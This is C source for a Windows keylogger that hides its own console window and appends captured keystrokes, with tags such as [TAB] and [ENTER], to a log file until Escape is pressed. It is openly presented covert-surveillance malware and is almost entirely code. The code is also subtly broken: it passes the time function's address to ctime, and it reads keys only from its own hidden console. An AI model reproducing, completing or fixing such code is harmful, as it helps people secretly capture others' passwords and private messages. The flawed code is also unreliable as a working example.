#include <stdio.h>
#include <conio.h>
#include <windows.h>
#include <time.h>
#define PATH "C:/Users/romain/Documents/keylogger/log.txt" // The path to the log file

int main(){
    char capture;
    FILE *file;
    time_t t;
    t = time(NULL);

    HWND window;
    AllocConsole();
    window=FindWindowA("ConsoleWindowClass",NULL);
    ShowWindow(window,0);

    file = fopen(PATH, "a+");
    fprintf(file, "\n\n#$Logger started @ %s", ctime(&time));

    while(1)
    {
        Sleep(20); 
        if (kbhit())
        {
            capture = getch();
            
            switch ((int)capture){
                case ' ': // Space key
                    fprintf(file, " ");
                    break;
                case 0x09: // Tab key.
                    fprintf(file, "[TAB]");
                    break;
                case 0x0D: // Enter key.
                    fprintf(file, "[ENTER]");
                    break;
                case 0x1B: // Escape key.
                    fprintf(file, "[ESC]");
                    break;
                case 0x08: // Backspace key.
                    fprintf(file, "[BACKSPACE]");
                    break;
                default:
                    fputc(capture,file); // Put any other inputted key into the file.
            }

            if ( (int) capture == 27 ){  // The escape key quit
                fclose(file);
                return 0;
            }
        }
    }
}
